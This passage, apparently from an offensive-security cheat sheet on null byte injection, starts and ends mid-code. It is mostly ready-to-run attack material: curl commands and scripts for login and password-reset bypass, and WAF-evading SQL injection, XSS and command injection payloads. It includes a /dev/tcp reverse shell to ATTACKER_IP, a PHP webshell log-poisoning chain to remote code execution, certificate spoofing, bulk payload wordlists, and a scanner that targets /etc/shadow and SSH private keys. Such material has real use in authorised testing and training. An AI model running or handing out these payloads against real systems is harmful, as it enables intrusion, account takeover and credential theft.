          "admin%00)(&(1=1",
          "*)(uid=*))(|(uid=*%00",
      ],
      "password": [
          "anything",
          "x",
          "%00",
          "*",
          ")(cn=*))(|(cn=*",
      ]
  }
  
  # Baseline — normal failed login
  r_base = requests.post(TARGET, data={"username": "admin", "password": "wrongpassword"}, 
                          verify=False, allow_redirects=False)
  baseline_status = r_base.status_code
  baseline_size = len(r_base.text)
  baseline_location = r_base.headers.get("Location", "none")
  
  print(f"[*] Baseline: status={baseline_status} size={baseline_size} redirect={baseline_location}")
  print("-" * 70)
  
  for user_payload in payloads["username"]:
      for pass_payload in payloads["password"]:
          try:
              r = requests.post(TARGET, 
                  data={"username": user_payload, "password": pass_payload},
                  verify=False, allow_redirects=False, timeout=10)
              
              status = r.status_code
              size = len(r.text)
              location = r.headers.get("Location", "none")
              
              # Detect differences from baseline
              is_different = (
                  status != baseline_status or
                  abs(size - baseline_size) > 50 or
                  location != baseline_location
              )
              
              indicator = "+" if is_different else " "
              
              if is_different:
                  print(f"[{indicator}] [{status}] size={size} redirect={location}")
                  print(f"    user={user_payload} pass={pass_payload}")
                  
                  # Check for auth success indicators
                  success_words = ["dashboard", "welcome", "admin", "logout", "profile", "session"]
                  for word in success_words:
                      if word in r.text.lower():
                          print(f"    [!!!] AUTH BYPASS DETECTED — found '{word}' in response!")
                          break
          
          except Exception as e:
              print(f"[E] {user_payload}: {e}")
  ```
  :::
::

### Authentication & Authorization Bypass

::tabs
  :::tabs-item{icon="i-lucide-lock-open" label="Username/Password Truncation"}
  ```bash
  # ── Null byte truncation in authentication ──
  
  # Scenario 1: Username comparison truncation
  # Backend: if (username == stored_user) → login
  # C-level strcmp: "admin\x00garbage" == "admin" → TRUE
  
  curl -X POST https://target.com/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin\u0000extradata","password":"anything"}'
  
  curl -X POST https://target.com/api/login \
    -d "username=admin%00whatever&password=anything"
  
  # Scenario 2: Password validation bypass
  # If password is compared at C level after null truncation
  curl -X POST https://target.com/api/login \
    -d "username=admin&password=%00"
  
  curl -X POST https://target.com/api/login \
    -d "username=admin&password=a%00"
  
  # Scenario 3: Email-based auth with null byte
  curl -X POST https://target.com/api/login \
    -d "email=admin@target.com%00@attacker.com&password=anything"
  
  curl -X POST https://target.com/api/login \
    -d "email=admin%00@attacker.com&password=anything"
  
  # Scenario 4: Token/API key truncation
  curl -s https://target.com/api/data \
    -H "Authorization: Bearer VALID_PREFIX%00garbagetokensuffix"
  
  curl -s https://target.com/api/data \
    -H "X-API-Key: VALID_KEY_START%00invalid_remainder"
  
  # Scenario 5: Session cookie manipulation
  curl -s https://target.com/dashboard \
    -H "Cookie: session=admin_session_id%00random_data"
  
  # ── Brute force username with null byte padding ──
  for user in admin root administrator superadmin operator system; do
      for null in "%00" "%2500" "%c0%80"; do
          for suffix in "" "x" "randomdata" "@attacker.com" ")(uid=*"; do
              STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
                https://target.com/login \
                -d "username=${user}${null}${suffix}&password=password123" \
                2>/dev/null)
              [ "$STATUS" != "401" ] && [ "$STATUS" != "403" ] && \
                echo "[${STATUS}] ${user}${null}${suffix}"
          done
      done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-lock-open" label="Registration & Password Reset"}
  ```bash
  # ── Null byte in registration to hijack existing accounts ──
  
  # Register with null byte after existing username
  curl -X POST https://target.com/api/register \
    -H "Content-Type: application/json" \
    -d '{"username":"admin\u0000attacker","email":"attacker@evil.com","password":"pass123"}'
  
  # If the app stores "admin\u0000attacker" but authenticates comparing C-level...
  # Login as "admin" with attacker's password may work
  curl -X POST https://target.com/api/login \
    -d "username=admin&password=pass123"
  
  # ── Password reset with null byte email truncation ──
  # Backend: send_reset_email(email_from_request)
  # DB lookup: WHERE email = "admin@target.com" (truncated at null)
  # Email sent to: attacker@evil.com (from original untruncated input)
  
  curl -X POST https://target.com/api/forgot-password \
    -d "email=admin@target.com%00@attacker.com"
  
  curl -X POST https://target.com/api/forgot-password \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@target.com\u0000.attacker.com"}'
  
  # ── OTP/Verification code bypass ──
  curl -X POST https://target.com/api/verify \
    -d "code=0000%00&email=victim@target.com"
  
  curl -X POST https://target.com/api/verify \
    -d "code=%00&email=victim@target.com"
  ```
  :::
::

### WAF & Filter Bypass

::accordion
  :::accordion-item{icon="i-lucide-shield-off" label="Null Byte WAF Evasion Techniques"}
  ```bash
  # ── Null byte to break WAF pattern matching ──
  
  # WAF blocks: ../etc/passwd
  # Null byte insertion may bypass regex/string matching
  
  # Insert null between path components
  curl -s "https://target.com/page?file=../%00../etc/passwd"
  curl -s "https://target.com/page?file=../..%00/etc/passwd"
  curl -s "https://target.com/page?file=../../etc%00/passwd"
  curl -s "https://target.com/page?file=../../etc/pass%00wd"
  
  # Null byte before SQL keywords (SQLi WAF bypass)
  curl -s "https://target.com/search?q=1'%00UNION%00SELECT%001,2,3--"
  curl -s "https://target.com/search?q=1'%00%55NION%00%53ELECT%001,2,3--"
  curl -s "https://target.com/search?q=1'/*%00*/UNION/*%00*/SELECT/*%00*/1,2,3--"
  
  # Null byte in XSS payloads (WAF bypass)
  curl -s "https://target.com/search?q=<scr%00ipt>alert(1)</scr%00ipt>"
  curl -s "https://target.com/search?q=<img%00src=x%00onerror=alert(1)>"
  curl -s "https://target.com/search?q=%3Cscript%3Ealert%00(1)%3C/script%3E"
  curl -s "https://target.com/search?q=<svg%00onload=alert(1)>"
  
  # Null byte in command injection (WAF bypass)
  curl -s "https://target.com/ping?host=127.0.0.1%00;id"
  curl -s "https://target.com/ping?host=127.0.0.1%00|id"
  curl -s "https://target.com/ping?host=127.0.0.1%00\`id\`"
  curl -s "https://target.com/ping?host=127.0.0.1%00\$(id)"
  
  # Double encoding + null byte
  curl -s "https://target.com/page?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd%2500"
  
  # Null byte between dots in traversal
  curl -s "https://target.com/page?file=.%00./.%00./etc/passwd"
  curl -s "https://target.com/page?file=.%00%00./.%00%00./etc/passwd"
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Header-Based Null Byte Injection"}
  ```bash
  # ── Null bytes in HTTP headers ──
  
  # Host header manipulation
  curl -s https://target.com/ \
    -H "Host: target.com%00.attacker.com"
  
  curl -s https://target.com/ \
    -H "Host: attacker.com%00.target.com"
  
  # X-Forwarded-For with null byte
  curl -s https://target.com/admin \
    -H "X-Forwarded-For: 127.0.0.1%00, 10.0.0.1"
  
  # Referer-based access control bypass
  curl -s https://target.com/admin \
    -H "Referer: https://target.com/admin%00https://attacker.com"
  
  # Origin header bypass
  curl -s https://target.com/api/data \
    -H "Origin: https://target.com%00.attacker.com"
  
  # User-Agent null byte injection (for log poisoning)
  curl -s https://target.com/ \
    -H "User-Agent: Mozilla/5.0%00<?php system(\$_GET['cmd']); ?>"
  
  # Cookie with null byte
  curl -s https://target.com/dashboard \
    -H "Cookie: role=admin%00; session=valid_session"
  
  curl -s https://target.com/dashboard \
    -H "Cookie: isAdmin=true%00false"
  
  # Content-Type null byte injection
  curl -X POST https://target.com/api/upload \
    -H "Content-Type: image/jpeg%00application/x-php" \
    --data-binary @shell.php
  
  # Accept header null byte
  curl -s https://target.com/api/data \
    -H "Accept: application/json%00text/html"
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Null Byte in Different Protocols"}
  ```bash
  # ── FTP via URL (SSRF + null byte) ──
  curl -s "https://target.com/fetch?url=ftp://attacker.com/evil.txt%00.jpg"
  
  # ── Gopher (SSRF chain + null byte) ──
  curl -s "https://target.com/fetch?url=gopher://127.0.0.1:6379/_%00SET%20pwned%20true"
  
  # ── File protocol + null byte ──
  curl -s "https://target.com/fetch?url=file:///etc/passwd%00.jpg"
  curl -s "https://target.com/fetch?url=file:///etc/passwd%2500.jpg"
  
  # ── SMTP injection with null byte ──
  curl -X POST https://target.com/contact \
    -d "email=victim@target.com%0d%0aCc:attacker@evil.com%00&message=test"
  
  # ── DNS rebinding with null byte ──
  curl -s "https://target.com/fetch?url=http://evil.com%00.target.com/data"
  
  # ── Redis protocol injection + null byte ──
  curl -s "https://target.com/fetch?url=http://127.0.0.1:6379/%00%0D%0ASET%20pwned%20true%0D%0A"
  ```
  :::
::

### Command Injection Enhancement

::code-group
```bash [OS Command Null Byte Bypass]
# ── Null byte in command injection contexts ──

# Bypass: system($input . ".log")
# Without null: system("127.0.0.1;id.log") — may error
# With null:    system("127.0.0.1;id\x00.log") — .log is truncated

# Basic command injection + null byte
curl -s "https://target.com/ping?ip=127.0.0.1%00;id"
curl -s "https://target.com/ping?ip=127.0.0.1%00|id"
curl -s "https://target.com/ping?ip=127.0.0.1%00%0aid"
curl -s "https://target.com/ping?ip=127.0.0.1%00||id"
curl -s "https://target.com/ping?ip=127.0.0.1%00&&id"

# Null byte to escape quoted context
curl -s "https://target.com/lookup?domain=test.com%00';id;'"
curl -s "https://target.com/lookup?domain=test.com%00\";id;\""

# Backtick injection + null byte
curl -s "https://target.com/lookup?domain=test.com%00\`id\`"

# $() substitution + null byte
curl -s "https://target.com/lookup?domain=test.com%00\$(id)"

# Newline + null byte combo
curl -s "https://target.com/lookup?domain=test.com%00%0a%0did"

# Reverse shell via null byte command injection
curl -s "https://target.com/ping?ip=127.0.0.1%00;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

```bash [Perl CGI Null Byte Command Injection]
# ── Perl is especially vulnerable to null byte command injection ──

# Perl's open() with pipe:
# open(FH, "/path/to/" . $input . ".txt");
# Perl doesn't truncate at null, but system calls do

# Null byte + pipe character in Perl open()
curl -s "https://target.com/cgi-bin/view.pl?file=|id%00"
curl -s "https://target.com/cgi-bin/view.pl?file=|cat%20/etc/passwd%00"
curl -s "https://target.com/cgi-bin/view.pl?file=|id|%00.txt"

# Perl system() with null byte
curl -s "https://target.com/cgi-bin/process.pl?input=test%00;id"
curl -s "https://target.com/cgi-bin/process.pl?input=test%00|cat+/etc/passwd"

# Perl backtick execution
curl -s "https://target.com/cgi-bin/process.pl?input=test%00\`id\`"

# File read via Perl null byte
curl -s "https://target.com/cgi-bin/view.pl?file=../../../etc/passwd%00"
curl -s "https://target.com/cgi-bin/view.pl?file=../../../etc/passwd%00.html"
curl -s "https://target.com/cgi-bin/view.pl?file=../../../etc/passwd%00.txt"
```

```bash [Python Null Byte Exploitation]
# ── Python 2.x is vulnerable, Python 3.x patched for os module ──
# But: custom C extensions, ctypes, cffi, subprocess edge cases

# Python 2.x file read
curl -s "https://target.com/api/read?file=../../../etc/passwd%00.txt"

# Python subprocess null byte
curl -s "https://target.com/api/run?cmd=id%00;malicious"

# Python os.path.join null byte (Python 2.x)
curl -s "https://target.com/api/download?path=../../../etc/passwd%00"

# Jinja2 SSTI with null byte to bypass filters
curl -s "https://target.com/page?name={{config}}%00"
curl -s "https://target.com/page?name={{%00config%00}}"

# Flask debug mode file read
curl -s "https://target.com/static/../../etc/passwd%00"
```
::

### SQL Injection Enhancement

::tabs
  :::tabs-item{icon="i-lucide-database" label="SQLi + Null Byte"}
  ```bash
  # ── Null byte to bypass WAF/filter on SQL injection ──
  
  # Break pattern matching between SQL keywords
  curl -s "https://target.com/search?q=1'%00UNION%00SELECT%001,2,3,4--"
  curl -s "https://target.com/search?q=1'%00UN%00ION%00SEL%00ECT%001,2,3--"
  
  # Null byte as comment alternative
  curl -s "https://target.com/search?q=1'%00OR%00'1'='1"
  curl -s "https://target.com/search?q=admin'%00--"
  curl -s "https://target.com/search?q=admin'%00#"
  
  # Null byte to truncate query suffix
  curl -s "https://target.com/search?q=1' UNION SELECT username,password FROM users--%00"
  
  # MySQL specific — null byte in string
  curl -s "https://target.com/search?q=1'%00UNION%00SELECT%00@@version,2,3%00--"
  
  # Bypass length filters (null truncates what WAF measures)
  curl -s "https://target.com/search?q=admin'or'1'='1%00$(python3 -c 'print("A"*5000)')"
  
  # Null byte in LIKE clause bypass
  curl -s "https://target.com/search?q=%25%00' OR 1=1--"
  
  # Stacked queries with null byte separator
  curl -s "https://target.com/search?q=1'%00;SELECT%20*%20FROM%20users--%00"
  
  # Null byte in hexadecimal payload
  curl -s "https://target.com/search?q=1'%00UNION%00SELECT%000x61646d696e,2,3--%00"
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="SQLi Null Byte Wordlist"}
  ```text
  # sqli_null_byte_payloads.txt
  # Save and use with sqlmap, ffuf, or Burp Intruder
  
  ' OR 1=1--%00
  ' OR '1'='1%00
  admin'%00--
  admin'%00#
  '%00OR%001=1--
  '%00UNION%00SELECT%00NULL--
  '%00UNION%00SELECT%001,2,3--
  '%00UNION%00SELECT%001,2,3,4--
  '%00UNION%00SELECT%001,2,3,4,5--
  1'%00UNION%00SELECT%00@@version--
  1'%00UNION%00SELECT%00user()--
  1'%00UNION%00SELECT%00database()--
  1'%00AND%001=1--
  1'%00AND%001=2--
  1'%00OR%00SLEEP(5)--
  1'%00AND%00BENCHMARK(5000000,SHA1('test'))--
  1%00' OR '1'='1
  1%00' UNION SELECT NULL--
  1' UNION%00SELECT table_name FROM information_schema.tables--
  1'/*%00*/UNION/*%00*/SELECT/*%00*/1,2,3--
  ```
  :::
::

### XSS & Client-Side Null Byte Attacks

::code-group
```bash [XSS Null Byte Bypass]
# ── Null byte to bypass XSS filters ──

# Break keyword detection
curl -s "https://target.com/search?q=<scr%00ipt>alert(document.domain)</scr%00ipt>"
curl -s "https://target.com/search?q=<sc%00ript>alert(1)</sc%00ript>"
curl -s "https://target.com/search?q=<script%00>alert(1)</script>"

# Null byte in event handlers
curl -s "https://target.com/search?q=<img%00src=x%00onerror%00=%00alert(1)>"
curl -s "https://target.com/search?q=<svg%00onload%00=%00alert(1)>"
curl -s "https://target.com/search?q=<body%00onload=alert(1)>"

# Null byte in href/src attributes
curl -s "https://target.com/search?q=<a%00href='javascript:alert(1)'>click</a>"
curl -s "https://target.com/search?q=<iframe%00src='javascript:alert(1)'>"

# Null byte with HTML entities
curl -s "https://target.com/search?q=%3Cscript%3Ealert%00(1)%3C/script%3E"

# JSON context null byte XSS
curl -s "https://target.com/api/search" \
  -H "Content-Type: application/json" \
  -d '{"q":"test\u0000<script>alert(1)</script>"}'

# URL encoding + null byte XSS
curl -s "https://target.com/search?q=%3Csvg%00onload%3Dalert(1)%3E"

# Null byte in DOM-based XSS
curl -s "https://target.com/page#%00<script>alert(1)</script>"
curl -s "https://target.com/page?ref=javascript%00:alert(1)"
```

```bash [XSS Null Byte Payloads]
# ── Comprehensive XSS null byte payload list ──

# Save as xss_null_payloads.txt for fuzzing
cat << 'EOF' > xss_null_payloads.txt
<scr%00ipt>alert(1)</scr%00ipt>
<sc%00ript>alert(1)</sc%00ript>
<scri%00pt>alert(1)</scri%00pt>
<script%00>alert(1)</script>
<script >alert(1)</script%00>
<img%00src=x onerror=alert(1)>
<img src=x%00onerror=alert(1)>
<img src=x onerror%00=alert(1)>
<svg%00onload=alert(1)>
<svg onload%00=alert(1)>
<body%00onload=alert(1)>
<input%00onfocus=alert(1) autofocus>
<marquee%00onstart=alert(1)>
<details%00open ontoggle=alert(1)>
<a href="javascript%00:alert(1)">x</a>
<a href="java%00script:alert(1)">x</a>
<a href="javas%00cript:alert(1)">x</a>
<iframe%00src="javascript:alert(1)">
<object%00data="javascript:alert(1)">
"%00onfocus="alert(1)" autofocus="
'%00onmouseover='alert(1)'
<math><mtext><table><mglyph><svg%00onload=alert(1)>
<svg><script%00>alert(1)</script>
EOF

# Fuzz with ffuf
ffuf -u "https://target.com/search?q=FUZZ" \
  -w xss_null_payloads.txt \
  -mc 200 -ms "alert(1)"
```
::

### Certificate Null Byte Attack

::note
CVE-2009-2408 demonstrated that null bytes in SSL/TLS certificate Common Name (CN) or Subject Alternative Name (SAN) fields could bypass certificate validation in many libraries.
::

::code-group
```bash [Certificate Null Byte Exploitation]
# ── Generate certificate with null byte in CN ──
# This exploits: www.target.com\0.attacker.com
# Validator sees: www.target.com (truncated at null)
# Certificate actually issued for: attacker.com's domain

# OpenSSL config for null byte CN
cat > null_cert.cnf << 'EOF'
[req]
distinguished_name = req_dn
x509_extensions = v3_req
prompt = no

[req_dn]
CN = www.target.com\x00.attacker.com
O = Attacker Corp
C = US

[v3_req]
subjectAltName = @alt_names

[alt_names]
DNS.1 = www.target.com\x00.attacker.com
DNS.2 = *.target.com\x00.attacker.com
EOF

# Generate self-signed cert with null byte CN
openssl req -new -x509 -keyout null_key.pem -out null_cert.pem \
  -days 365 -nodes -config null_cert.cnf

# Inspect the certificate
openssl x509 -in null_cert.pem -text -noout | grep -A2 "Subject:"
openssl x509 -in null_cert.pem -text -noout | grep -A5 "Subject Alternative Name"

# Use with MitM proxy (for testing only)
# mitmproxy --cert null_cert.pem --key null_key.pem

# Test if target client validates null byte in CN
# Many older libraries (Python < 2.7.9, Ruby < 2.0, Node.js < 0.12) were vulnerable

# Check Python SSL validation
python3 -c "
import ssl, socket
ctx = ssl.create_default_context()
try:
    conn = ctx.wrap_socket(socket.socket(), server_hostname='www.target.com')
    conn.connect(('attacker.com', 443))
    print('[+] Connection accepted — client may be vulnerable to null byte CN')
except ssl.CertificateError as e:
    print(f'[-] Properly rejected: {e}')
except Exception as e:
    print(f'[?] Error: {e}')
"
```

```bash [Detect Vulnerable Clients]
# ── Test various SSL/TLS clients for null byte CN vulnerability ──

# Python 2.x (likely vulnerable)
python2 -c "
import urllib2
try:
    urllib2.urlopen('https://www.target.com\\x00.attacker.com/')
    print('VULNERABLE')
except:
    print('SAFE or ERROR')
" 2>/dev/null

# curl (test version)
curl --version | head -1
# curl versions before 7.42.0 with NSS backend were partially vulnerable

# wget
wget --version | head -1
# Older wget versions may be vulnerable

# Check OpenSSL version
openssl version
# OpenSSL < 1.0.0d was vulnerable

# Ruby check
ruby -e "
require 'net/https'
require 'uri'
# Ruby < 2.0 was vulnerable to null byte CN
puts RUBY_VERSION
"

# Java check
java -version 2>&1
# Java < 7u40 was vulnerable
```
::

### Log Injection & Poisoning

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="Log Entry Manipulation"}
  ```bash
  # ── Null byte to break log parsers and inject false entries ──
  
  # Inject null byte to terminate log line, create fake entries
  curl -s "https://target.com/" \
    -H "User-Agent: NormalBrowser%00\n200 OK /admin - admin_user - login_success"
  
  # Inject PHP code into logs (for LFI chain)
  curl -s "https://target.com/" \
    -H "User-Agent: <?php system(\$_GET['cmd']); ?>%00NormalBrowser/1.0"
  
  # Break structured logging (JSON logs)
  curl -s "https://target.com/" \
    -H "User-Agent: test%00\",\"level\":\"CRITICAL\",\"message\":\"SECURITY_BREACH\",\"user\":\"admin"
  
  # Null byte in request path (appears in access logs)
  curl -s "https://target.com/page%00<?php%20system('id');%20?>"
  
  # Log injection via Referer header
  curl -s "https://target.com/" \
    -H "Referer: https://target.com/admin%00<?php system(\$_GET['c']); ?>"
  
  # Null byte in query parameters (logged by WAF/IDS)
  curl -s "https://target.com/search?q=legitimate%00%3Cscript%3Ealert('xss')%3C/script%3E"
  
  # Break syslog format with null byte
  curl -s "https://target.com/login" \
    -d "username=admin%00\nDec 25 00:00:00 target sshd[1234]: Accepted password for root from 10.0.0.1"
  
  # Break CSV/TSV log exports
  curl -s "https://target.com/" \
    -H "User-Agent: normal%00\",\"admin\",\"success\",\"10.0.0.1"
  ```
  :::

  :::tabs-item{icon="i-lucide-file-text" label="Log Poisoning to RCE Chain"}
  ```bash
  # ── Full chain: Log injection → Null byte LFI → RCE ──
  
  TARGET="https://target.com"
  
  echo "[*] Step 1: Inject PHP code into access log via User-Agent"
  curl -s "${TARGET}/" \
    -H "User-Agent: PAYLOAD_START<?php if(isset(\$_GET['cmd'])){echo '<pre>'.shell_exec(\$_GET['cmd']).'</pre>';}?>PAYLOAD_END"
  
  echo "[*] Step 2: Inject via Referer as backup"
  curl -s "${TARGET}/" \
    -H "Referer: <?php system(\$_GET['cmd']); ?>"
  
  echo "[*] Step 3: Include log file with null byte to bypass .php extension"
  
  LOG_PATHS=(
      "../../../var/log/apache2/access.log"
      "../../../var/log/nginx/access.log"
      "../../../var/log/httpd/access_log"
      "../../../../var/log/apache2/access.log"
      "../../../../../var/log/apache2/access.log"
      "../../../opt/lampp/logs/access_log"
      "../../../usr/local/apache/logs/access_log"
      "../../../proc/self/fd/1"
  )
  
  for log_path in "${LOG_PATHS[@]}"; do
      echo "[*] Trying: ${log_path}%00"
      RESULT=$(curl -s "${TARGET}/index.php?page=${log_path}%00&cmd=id" 2>/dev/null)
      
      if echo "$RESULT" | grep -q "uid="; then
          echo "[+] RCE ACHIEVED via: ${log_path}%00"
          echo "[+] Response: $(echo "$RESULT" | grep 'uid=')"
          echo ""
          echo "[*] Interactive command execution:"
          echo "    curl '${TARGET}/index.php?page=${log_path}%00&cmd=COMMAND'"
          break
      fi
  done
  ```
  :::
::

---

## Payload Arsenal

### Comprehensive Payload Lists

::code-collapse
```text [null_byte_lfi_payloads.txt]
# ═══════════════════════════════════════════
# NULL BYTE LFI PAYLOADS — COMPREHENSIVE
# ═══════════════════════════════════════════

# ── Standard null byte with depth variation ──
../etc/passwd%00
../../etc/passwd%00
../../../etc/passwd%00
../../../../etc/passwd%00
../../../../../etc/passwd%00
../../../../../../etc/passwd%00
../../../../../../../etc/passwd%00
../../../../../../../../etc/passwd%00

# ── Null byte with forced extension bypass ──
../../../etc/passwd%00.php
../../../etc/passwd%00.html
../../../etc/passwd%00.txt
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
../../../etc/passwd%00.xml
../../../etc/passwd%00.json
../../../etc/passwd%00.css
../../../etc/passwd%00.js
../../../etc/passwd%00.inc
../../../etc/passwd%00.cfg
../../../etc/passwd%00.conf
../../../etc/passwd%00.log
../../../etc/passwd%00.bak
../../../etc/passwd%00.old
../../../etc/passwd%00.orig
../../../etc/passwd%00.tmp
../../../etc/passwd%00.swp

# ── Double URL encoded null byte ──
../../../etc/passwd%2500
../../../etc/passwd%2500.php
../../../etc/passwd%2500.html

# ── Overlong UTF-8 null byte ──
../../../etc/passwd%c0%80
../../../etc/passwd%c0%80.php
../../../etc/passwd%e0%80%80
../../../etc/passwd%f0%80%80%80

# ── Unicode null byte ──
../../../etc/passwd%u0000
../../../etc/passwd%u0000.php

# ── Multiple null bytes ──
../../../etc/passwd%00%00
../../../etc/passwd%00%00.php
../../../etc/passwd%00%00%00

# ── Path traversal encoding + null byte ──
..%2f..%2f..%2fetc%2fpasswd%00
..%252f..%252f..%252fetc%252fpasswd%00
..%255c..%255c..%255cetc%255cpasswd%00
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00
%2e%2e/%2e%2e/%2e%2e/etc/passwd%00
....//....//....//etc/passwd%00
....\\....\\....\\etc\\passwd%00
..%00/..%00/..%00/etc/passwd
..%00%2f..%00%2f..%00%2fetc%2fpasswd

# ── Backslash variants + null byte ──
..\..\..\etc\passwd%00
..\\..\\..\\etc\\passwd%00
..%5c..%5c..%5cetc%5cpasswd%00
..%255c..%255c..%255cetc%255cpasswd%00

# ── Absolute path + null byte ──
/etc/passwd%00
/etc/passwd%00.php
/etc/passwd%00.html

# ── File protocol + null byte ──
file:///etc/passwd%00
file:///etc/passwd%00.php

# ── PHP wrapper + null byte ──
php://filter/convert.base64-encode/resource=../../../etc/passwd%00
php://filter/read=string.rot13/resource=../../../etc/passwd%00
php://filter/convert.iconv.utf-8.utf-16/resource=index%00

# ── Current directory + null byte ──
./../../etc/passwd%00
./../../../etc/passwd%00

# ── Mixed separator + null byte ──
../..\\../etc/passwd%00
..\\../..\\etc/passwd%00
..%2f..%5c..%2fetc/passwd%00

# ── Windows targets + null byte ──
..\\..\\..\\windows\\system.ini%00
..\\..\\..\\windows\\win.ini%00
..\\..\\..\\boot.ini%00
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00
..%5c..%5c..%5cwindows%5csystem.ini%00
..\..\..\windows\system.ini%00
..\\..\\..\\inetpub\\wwwroot\\web.config%00
..\\..\\..\\xampp\\passwords.txt%00
```
::

::code-collapse
```text [null_byte_universal_payloads.txt]
# ═══════════════════════════════════════════
# NULL BYTE UNIVERSAL PAYLOADS
# For auth bypass, filter evasion, injection
# ═══════════════════════════════════════════

# ── Authentication bypass ──
admin%00
admin%2500
admin%c0%80
admin%00anything
root%00
administrator%00
admin%00)(uid=*
*%00
admin%00@target.com
admin%00%00
admin\x00

# ── Password field ──
%00
a%00
pass%00garbage
%00password
password%00extrastuff

# ── Email null byte ──
admin@target.com%00@attacker.com
admin@target.com%00.attacker.com
admin%00@attacker.com
victim%00attacker@evil.com

# ── File upload filename ──
shell.php%00.jpg
shell.php%00.png
shell.php%00.gif
shell.php%00.pdf
shell.php%00.txt
shell.phtml%00.jpg
shell.php5%00.jpg
shell.pHp%00.jpg
shell.PHP%00.jpg
shell%00.php.jpg
shell.php%2500.jpg
shell.php%c0%80.jpg
shell.php%e0%80%80.jpg

# ── Command injection + null byte ──
127.0.0.1%00;id
127.0.0.1%00|id
127.0.0.1%00||id
127.0.0.1%00&&id
127.0.0.1%00`id`
127.0.0.1%00$(id)
test%00;cat /etc/passwd
test%00|whoami
test%00%0aid

# ── XSS + null byte ──
<scr%00ipt>alert(1)</scr%00ipt>
<img%00src=x%00onerror=alert(1)>
<svg%00onload=alert(1)>
"%00onfocus="alert(1)"
<script%00>alert(1)</script>

# ── SQLi + null byte ──
'%00OR%001=1--
'%00UNION%00SELECT%001,2,3--
admin'%00--
1'%00AND%00SLEEP(5)--

# ── LDAP + null byte ──
admin%00)(|(uid=*)
*%00)(uid=*)
admin%00)(&
admin%00)(%26)(uid%3d*

# ── SSRF + null byte ──
http://127.0.0.1%00@attacker.com
http://attacker.com%00.target.com
file:///etc/passwd%00.jpg
```
::

---

## Automated Testing Tools

### Custom Null Byte Scanner

::code-collapse
```python [null_byte_scanner.py]
#!/usr/bin/env python3
"""
Comprehensive Null Byte Injection Scanner
Tests multiple injection points and encoding variations
"""
import requests
import urllib3
import sys
import time
import re
import json
from urllib.parse import quote, unquote
urllib3.disable_warnings()

class NullByteScanner:
    def __init__(self, target_url, param_name, cookies=None, headers=None):
        self.target_url = target_url
        self.param = param_name
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 15
        
        if cookies:
            self.session.cookies.update(cookies)
        if headers:
            self.session.headers.update(headers)
        
        self.results = []
        self.baseline = None
    
    def get_baseline(self):
        """Establish baseline responses"""
        baselines = {}
        
        # Normal valid request
        r = self.session.get(f"{self.target_url}?{self.param}=home")
        baselines['normal'] = {'status': r.status_code, 'size': len(r.text), 'hash': hash(r.text)}
        
        # Invalid request
        r = self.session.get(f"{self.target_url}?{self.param}=nonexistent_xyz_test")
        baselines['invalid'] = {'status': r.status_code, 'size': len(r.text), 'hash': hash(r.text)}
        
        # Traversal without null byte
        r = self.session.get(f"{self.target_url}?{self.param}=../../../etc/passwd")
        baselines['traversal'] = {'status': r.status_code, 'size': len(r.text), 'hash': hash(r.text)}
        
        self.baseline = baselines
        print(f"[*] Baselines established:")
        for name, data in baselines.items():
            print(f"    {name}: status={data['status']} size={data['size']}")
        print()
        
        return baselines
    
    def generate_lfi_payloads(self):
        """Generate LFI null byte payloads"""
        payloads = []
        
        null_variants = ["%00", "%2500", "%c0%80", "%e0%80%80", "%u0000", "%00%00"]
        extensions = ["", ".php", ".html", ".txt", ".jpg", ".xml", ".json", ".inc"]
        separators = ["../", "..%2f", "..%252f", "....//", "..\\", "..%5c"]
        
        target_files = [
            "etc/passwd", "etc/shadow", "etc/hosts", "etc/hostname",
            "proc/self/environ", "proc/version", "proc/self/cmdline",
            "var/log/apache2/access.log", "var/log/nginx/access.log",
            "root/.ssh/id_rsa", "root/.bash_history",
        ]
        
        for null in null_variants:
            for ext in extensions:
                for sep in separators:
                    for depth in range(1, 10):
                        for target_file in target_files:
                            traversal = sep * depth
                            payload = f"{traversal}{target_file}{null}{ext}"
                            payloads.append({
                                'payload': payload,
                                'null': null,
                                'ext': ext,
                                'sep': sep,
                                'depth': depth,
                                'file': target_file,
                                'type': 'lfi'
                            })
        
        return payloads
    
    def generate_auth_payloads(self):
        """Generate authentication bypass payloads"""
        payloads = []
        usernames = ["admin", "root", "administrator", "Admin"]
        null_variants = ["%00", "%2500", "%c0%80", "\\x00", "\\u0000"]
        suffixes = ["", "x", "anything", ")(uid=*", "@attacker.com", ")(&)("]
        
        for user in usernames:
            for null in null_variants:
                for suffix in suffixes:
                    payloads.append({
                        'payload': f"{user}{null}{suffix}",
                        'type': 'auth',
                        'user': user,
                        'null': null
                    })
        
        return payloads
    
    def check_lfi_success(self, response_text):
        """Check if LFI was successful"""
        indicators = [
            r"root:.*:0:0:",
            r"daemon:.*:1:1:",
            r"nobody:.*:65534:",
            r"\[boot loader\]",
            r"\[fonts\]",
            r"HTTP_USER_AGENT",
            r"DOCUMENT_ROOT",
            r"BEGIN RSA PRIVATE KEY",
            r"BEGIN OPENSSH PRIVATE KEY",
            r"mysql_native_password",
        ]
        
        for pattern in indicators:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False
    
    def scan_lfi(self, max_payloads=500, delay=0.2):
        """Scan for LFI via null byte injection"""
        if not self.baseline:
            self.get_baseline()
        
        payloads = self.generate_lfi_payloads()[:max_payloads]
        
        print(f"[*] Testing {len(payloads)} LFI null byte payloads")
        print("-" * 70)
        
        found = []
        
        for i, p in enumerate(payloads):
            try:
                url = f"{self.target_url}?{self.param}={p['payload']}"
                r = self.session.get(url)
                
                is_success = self.check_lfi_success(r.text)
                size_diff = abs(len(r.text) - self.baseline['invalid']['size'])
                is_different = size_diff > 100 or r.status_code != self.baseline['invalid']['status']
                
                if is_success:
